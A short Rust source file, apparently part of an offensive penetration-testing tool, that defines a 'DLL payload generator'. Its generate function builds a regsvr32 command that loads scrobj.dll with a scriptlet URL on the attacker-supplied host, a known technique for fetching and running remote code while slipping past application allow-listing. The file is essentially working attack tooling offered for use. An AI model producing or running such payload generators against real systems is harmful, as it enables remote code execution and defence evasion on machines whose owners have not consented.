// Windows DLL payload generator
use crate::cli::banner;

pub struct DllGenerator;

impl DllGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, arch: &str) -> String {
        banner::print_exploiting("DLL-PAYLOAD", &format!("{}:{}", lhost, lport));
        format!(
            "regsvr32 /s /n /u /i:http://{}/payload.sct scrobj.dll,DAComServerObject,ActiveX,Process",
            lhost
        )
    }
}
